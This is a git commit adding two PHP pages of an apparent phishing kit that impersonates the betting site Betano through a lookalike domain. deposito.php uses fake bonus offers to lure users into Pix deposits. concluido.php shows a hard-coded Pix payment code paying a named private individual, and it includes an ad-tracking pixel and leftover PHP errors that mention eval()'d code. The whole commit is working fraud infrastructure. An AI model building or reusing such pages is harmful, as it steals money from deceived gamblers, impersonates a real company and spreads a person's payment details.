07fdd915fe8010ba72beaacca651dc94e3d9f8ce
neblinabala-boop <neblinabala@gmail.com>
2026-04-30 02:43:08 -0300

    Add files via upload

---
+++ concluido.php
@@ -0,0 +1,139 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="icon" href="https://br59.betano-com.online/public/_img/favicon.png">
+  <title>Apostas Esportivas - Online Apostas e Jogos ao Vivo | Betano</title>
+  <link href="css/bootstrap.css" rel="stylesheet">
+  <link href="css/all.min.css" rel="stylesheet">
+  <link href="css/style.css" rel="stylesheet">
+<script type="text/javascript" async="" src="js/events.js"></script><script>
+!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}(window,(function(){return function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}return n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(n.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)n.d(r,o,function(t){return e[t]}.bind(null,o));return r},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var r=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var r,o=0,i=t.length;o<i;o++)!r&&o in t||(r||(r=Array.prototype.slice.call(t,0,o)),r[o]=t[o]);return e.concat(r||Array.prototype.slice.call(t))};!function(e){var t=window;t.KwaiAnalyticsObject=e,t[e]=t[e]||[];var n=t[e];n.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var o=function(e,t){e[t]=function(){var n=Array.from(arguments),o=r([t],n,!0);e.push(o)}};n.methods.forEach((function(e){o(n,e)})),n.instance=function(e){var t=n._i[e]||[];return n.methods.forEach((function(e){o(t,e)})),t},n.load=function(t,r){n._i=n._i||{},n._i[t]=[],n._i[t]._u="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js",n._t=n._t||{},n._t[t]=+new Date,n._o=n._o||{},n._o[t]=r||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js?sdkid="+t+"&lib="+e;var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(o,i)}}("kwaiq")}])}));
+</script><script>
+kwaiq.load('562475819311312917');
+kwaiq.page();
+</script></head>
+
+
+
+
+<body class="modal-open" style="padding-right: 17px;">
+  <main>
+    <img src="images/mkFundoDesktop.png" class="mkFundoDesktop">
+    <img src="images/mkFundoMobile.png" class="mkFundoMobile">
+  </main>
+<br>
+<b>Notice</b>:  Undefined index: inputDeposito in <b>C:\xampp\htdocs\concluido.php</b> on line <b>36</b><br>
+<br>
+<b>Notice</b>:  Undefined index: inputDeposito in <b>C:\xampp\htdocs\concluido.php</b> on line <b>79</b><br>
+<br>
+<b>Warning</b>:  number_format() expects parameter 1 to be float, string given in <b>C:\xampp\htdocs\funcoes_pix.php(1) : eval()'d code</b> on line <b>26</b><br>
+  <div class="modal fade show" id="mkModalPixGerado" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" data-backdrop="static" aria-modal="true" style="padding-right: 17px; display: block;">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-body p-3">
+          <div class="container">
+            <div class="row">
+              <div class="col-md-8 m-auto">
+                <section class="mkPixGerado text-center">
+                  <img src="images/mkIconeSucesso.png">
+                  <h3 class="mt-3 mb-3">Ação cocluida com sucesso</h3>
+                  <p>Use o QR code para prosseguir com a transação. Assim que a transação for concluida, você receberá
+                    uma notificação.</p>
+                  <div class="mkImgQrcode">
+                    <img width="124" height="124" src="image/Screenshot_20231213-180600.png">                  </div>
+                  <br>
+                  <div class="mkCopiaColaCodigo">
+                    <textarea cols="40" rows="6" id="mkCodigoPix">00020101021126580014br.gov.bcb.pix01363aba30ef-1411-435f-b330-f8f44a80c3b25204000053039865802BR5918Guilherme Sa Alves6009SAO PAULO622905251H5FZG0TYQ4JCRJYSAHHY7DG963046B95</textarea>
+                  </div>
+                  <form method="POST" name="mkFormCliquePix" id="mkFormCliquePix">
+                    <input type="hidden" name="id" id="id" value="147">
+                    <button type="button" class="btn btn-primary mkBtnContinuar" id="mkCopiaCodigo">
+                      <svg width="17" fill="#fff" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 460 460" style="enable-background:new 0 0 460 460;" xml:space="preserve">
+                        <g>
+                          <g>
+                            <g>
+                              <path d="M425.934,0H171.662c-18.122,0-32.864,14.743-32.864,32.864v77.134h30V32.864c0-1.579,1.285-2.864,2.864-2.864h254.272     c1.579,0,2.864,1.285,2.864,2.864v254.272c0,1.58-1.285,2.865-2.864,2.865h-74.729v30h74.729     c18.121,0,32.864-14.743,32.864-32.865V32.864C458.797,14.743,444.055,0,425.934,0z"></path>
+                              <path d="M288.339,139.998H34.068c-18.122,0-32.865,14.743-32.865,32.865v254.272C1.204,445.257,15.946,460,34.068,460h254.272     c18.122,0,32.865-14.743,32.865-32.864V172.863C321.206,154.741,306.461,139.998,288.339,139.998z M288.341,430H34.068     c-1.58,0-2.865-1.285-2.865-2.864V172.863c0-1.58,1.285-2.865,2.865-2.865h254.272c1.58,0,2.865,1.285,2.865,2.865v254.273h0.001     C291.206,428.715,289.92,430,288.341,430z"></path>
+                            </g>
+                          </g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                        <g>
+                        </g>
+                      </svg>
+                      Copiar código
+                    </button>
+                  </form>
+                </section>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+<script src="jquery-3.5.1.min.js.download"></script>
+<script type="text/javascript" src="bootstrap.js.download"></script>
+<script type="text/javascript" src="base.js.download"></script>
+<script type="text/javascript">
+  $(document).ready(function () {
+    $('#mkModalPixGerado').modal('show');
+  })
+
+  $('#mkCopiaCodigo').click(function () {
+    $('#mkCodigoPix').select();
+    try {
+      var ok = document.execCommand('copy');
+      if (ok) {
+        var id = $('#id').val();
+        $.post('../public/_php/mkContaCopiaPix.php', {
+          id: id
+        }, function (resposta) {
+          if (resposta == 1) {
+            alert('Mensagem enviada com sucesso.');
+            return false;
+          } else {
+            alert("Código pix copiado com sucesso");
+            return false;
+          }
+        });
+      }
+    } catch (e) {
+      alert(e)
+    }
+  });
+
+
+</script>
+
+<div class="modal-backdrop fade show"></div></body></html>
---
+++ deposito.php
@@ -0,0 +1,225 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  
+<script type="text/javascript" async="" src="js/events.js"></script><script type="text/javascript" async="" src="js/events.js"></script><script>
+!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}(window,(function(){return function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}return n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(n.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)n.d(r,o,function(t){return e[t]}.bind(null,o));return r},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var r=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var r,o=0,i=t.length;o<i;o++)!r&&o in t||(r||(r=Array.prototype.slice.call(t,0,o)),r[o]=t[o]);return e.concat(r||Array.prototype.slice.call(t))};!function(e){var t=window;t.KwaiAnalyticsObject=e,t[e]=t[e]||[];var n=t[e];n.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var o=function(e,t){e[t]=function(){var n=Array.from(arguments),o=r([t],n,!0);e.push(o)}};n.methods.forEach((function(e){o(n,e)})),n.instance=function(e){var t=n._i[e]||[];return n.methods.forEach((function(e){o(t,e)})),t},n.load=function(t,r){n._i=n._i||{},n._i[t]=[],n._i[t]._u="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js",n._t=n._t||{},n._t[t]=+new Date,n._o=n._o||{},n._o[t]=r||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js?sdkid="+t+"&lib="+e;var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(o,i)}}("kwaiq")}])}));
+</script>
+<script>
+kwaiq.load('562475819311312917');
+kwaiq.page();
+</script>
+
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <link rel="icon" href="https://br59.betano-com.online/public/_img/favicon.png">
+  <title>Apostas Esportivas - Online Apostas e Jogos ao Vivo | Betano</title>
+  <link href="css/bootstrap.css" rel="stylesheet">
+  <link href="css/all.min.css" rel="stylesheet">
+  <link href="css/style.css" rel="stylesheet">
+  <script>
+function copiar() {
+  var copyText = document.getElementById("brcodepix");
+  copyText.select();
+  copyText.setSelectionRange(0, 99999); /* For mobile devices */
+  document.execCommand("copy");
+  document.getElementById("clip_btn").innerHTML='<i class="fas fa-clipboard-check"></i>';
+}
+function reais(v){
+    v=v.replace(/\D/g,"");
+    v=v/100;
+    v=v.toFixed(2);
+    return v;
+}
+function mascara(o,f){
+    v_obj=o;
+    v_fun=f;
+    setTimeout("execmascara()",1);
+}
+function execmascara(){
+    v_obj.value=v_fun(v_obj.value);
+}
+$(function () {
+  $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+  <style>
+    .modal-content {
+      top: 0;
+    }
+  </style>
+<script>
+!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.install=t():e.install=t()}(window,(function(){return function(e){var t={};function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}return n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(n.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var o in e)n.d(r,o,function(t){return e[t]}.bind(null,o));return r},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=0)}([function(e,t,n){"use strict";var r=this&&this.__spreadArray||function(e,t,n){if(n||2===arguments.length)for(var r,o=0,i=t.length;o<i;o++)!r&&o in t||(r||(r=Array.prototype.slice.call(t,0,o)),r[o]=t[o]);return e.concat(r||Array.prototype.slice.call(t))};!function(e){var t=window;t.KwaiAnalyticsObject=e,t[e]=t[e]||[];var n=t[e];n.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"];var o=function(e,t){e[t]=function(){var n=Array.from(arguments),o=r([t],n,!0);e.push(o)}};n.methods.forEach((function(e){o(n,e)})),n.instance=function(e){var t=n._i[e]||[];return n.methods.forEach((function(e){o(t,e)})),t},n.load=function(t,r){n._i=n._i||{},n._i[t]=[],n._i[t]._u="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js",n._t=n._t||{},n._t[t]=+new Date,n._o=n._o||{},n._o[t]=r||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src="https://s1.kwai.net/kos/s101/nlav11187/pixel/events.js?sdkid="+t+"&lib="+e;var i=document.getElementsByTagName("script")[0];i.parentNode.insertBefore(o,i)}}("kwaiq")}])}));
+</script><script>
+kwaiq.load('562475819311312917');
+kwaiq.page();
+</script></head>
+
+
+
+
+
+
+<body class="modal-open" style="padding-right: 17px;">
+  <section>
+    <img src="images/mkFundoDesktop.png" class="mkFundoDesktop">
+    <img src="images/mkFundoMobile.png" class="mkFundoMobile">
+  </section>
+
+  <div class="modal fade show" id="mkModalPix" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" data-backdrop="static" aria-modal="true" style="padding-right: 17px; display: block;">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-body">
+          <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-5">
+              <div class="mkIconeInfo">
+                <div class="row">
+                  <div class="hidden-xs col-sm-6 col-md-12 mb-3">
+                    <img src="images/logoPix.webp" width="100">
+                  </div>
+                  <div class="col-xs-12 col-sm-6 col-md-12 deposit-limits-container">
+                    <div class="deposit-limits">
+                      <i class="fa-solid fa-arrow-right-arrow-left mkIconeDeposito"></i>
+                      <div class="limit-container">Mín. R$50,00</div>
+                      <div class="limit-container">Máx. R$20.000,00</div>
+                    </div>
+                    <div class="time-container mt-2">
+                      <i class="fa-regular fa-clock"></i>
+                      <span class="text">Tempo de processamento:</span>
+                      <span>Até 30 minutos</span>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="col-xs-12 col-sm-10 col-md-7 mkMainInfo">
+              <div class="container">
+                <div class="row">
+                  <div class="col-md-12">
+                    <div class="form-group">
+                      <h5><b>PIX</b></h5>
+                      <p>Para fazer um depósito via Pix,�&nbsp;<strong>insira o valor que deseja
+                          depositar no campo abaixo e clique no botão "Depositar". Um QR Code será criado e aparecerá na
+                          tela.</strong></p>
+                      <p>Agora só falta�&nbsp;<strong>escanear o QR Code</strong>�&nbsp;com o App do seu
+                        banco e confirmar o pagamento.</p>
+                      <p>Caso esteja utilizando seu telefone, você pode copiar e colar o código logo
+                        abaixo do QR Code e pagar pela opção “Copiar e Colar” no App do seu banco.</p>
+                    </div>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="col-md-12">
+                    <strong>Valor do depósito</strong>
+                    <br>
+    
+
+	
+<button class="mkBtnValorPix" id="pix50" value="50">R$50</button>
+<button class="mkBtnValorPix" id="pix200" value="200">R$200</button>
+<button class="mkBtnValorPix" id="pix500" value="500">R$500</button>
+
+				<form method="post" action="concluido.php">
+											                                      <input type="hidden" id="id" name="id" value="147">
+                      <div class="input-group mt-3 mkInputGroup">
+                        <div class="input-group-prepend">
+                          <span class="input-group-text" id="basic-addon1">R$ </span>
+                        </div>
+                        <input type="tel" class="mkInputDeposito" name="inputDeposito" id="inputDeposito" value="50" onkeyup="getVal()" required="">
+                      </div>
+                      <section class="mkBonusPix mt-3">
+                        <span><b>Deseja aproveitar seu bônus?</b></span>
+                        <p>É necessário um depósito de R$50 para receber seu bônus.</p>
+                        <span>Selecionar seu bônus</span>
+                        <br>
+                        <div class="mkListaBonus mt-2">
+                          <input type="radio" name="imagem" id="item1">
+                          <label for="item1" class="mkItemBonus col" id="labelItem1">
+                            <img src="images/mkIconeEsporte.png" class="img-fluid">
+                            <div class="mkValoresBonus">
+                              <span>R$<div id="valorBonus">50</div> Bônus + 40 Rodadas Grátis </span>
+                              <p>100% até R$ <small id="valorDeposito">50</small></p>
+                            </div>
+                            <p class="mkTipoBonus">Apostas Esportivas</p>
+                          </label>
+                          <input type="radio" name="imagem" id="item2">
+                          <label for="item2" class="mkItemBonus col">
+                            <img src="images/mkIconeCassino.png" class="img-fluid">
+                            <div class="mkValoresBonus">
+                              <span>R$<div id="valorBonus1">50</div> Bônus + 40 Rodadas Grátis </span>
+                              <p>100% até R$ <small id="valorDeposito1">50</small></p>
+                            </div>
+                            <p class="mkTipoBonus">Cassino</p>
+                          </label>
+                          <input type="radio" name="imagem" id="item3">
+                          <label for="item3" class="mkItemBonus col">
+                            <img src="images/mkIconeAposta.png" class="img-fluid">
+                            <div class="mkValoresBonus">
+                              <span>R$<div id="valorBonus2">50</div> Bônus + 40 Rodadas Grátis </span>
+                              <p>100% até R$ <small id="valorDeposito2">50</small></p>
+                            </div>
+                            <p class="mkTipoBonus">Apostas Gerais</p>
+                          </label>
+                          <input type="radio" name="imagem" id="item4">
+                          <label for="item4" class="mkItemBonus col">
+                            <img src="images/mkIconeApostaDescartar.png" class="img-fluid">
+                            <div class="mkValoresBonus">
+                              <span class="mkDanger">Sem Bônus</span>
+                              <p style="font-size: 7px;">Seu bônus será perdido</p>
+                            </div>
+                            <p class="mkTipoBonus">Bônus descartado</p>
+                          </label>
+                        </div>
+                      </section>
+                      <div class="form-group mt-3">
+                        <button type="submit" class="mkBtnDepositar">Depositar</button>
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+<script src="jquery-3.5.1.min.js.download"></script>
+<script type="text/javascript" src="bootstrap.js.download"></script>
+<script type="text/javascript" src="base.js.download"></script>
+<script type="text/javascript">
+  $(document).ready(function () {
+    $('#mkModalPix').modal('show');
+  })
+
+  $('#pix50').click(function () {
+    $('#inputDeposito').val($(this).val());
+    $("#valorDeposito").text($(this).val());
+    $("#valorDeposito1").text($(this).val());
+    $("#valorDeposito2").text($(this).val());
+    $("#valorBonus").text($(this).val());
+    $("#valorBonus1").text($(this).val());
+    $("#valorBonus2").text($(this).val());
+  });
+  $('#pix200').click(function () {
+    $('#inputDeposito').val($(this).val());
+    $("#valorDeposito").text($(this).val());
+    $("#valorDeposito1").text($(this).val());
+    $("#valorDeposito2").text($(this).val());
+    $("#valorBonus").text($(this).val());
+    $("#valorBonus1").text($(this).val());
+    $("#valorBonus2").text($(this).val());
+  });
+  $('#pix500').click(function () {
+    $('#inputDeposito').val($(this).val());
+    $("#valorDeposito").text($(this).val());
+    $("#valorDeposito1").text($(this).val());
+    $("#valorDeposito2").text($(this).val());
+    $("#valorBonus").text($(this).val());
+    $("#valorBonus1").text($(this).val());
+    $("#valorBonus2").text($(this).val());
+  });
+</script>
+
+<div class="modal-backdrop fade show"></div></body></html>
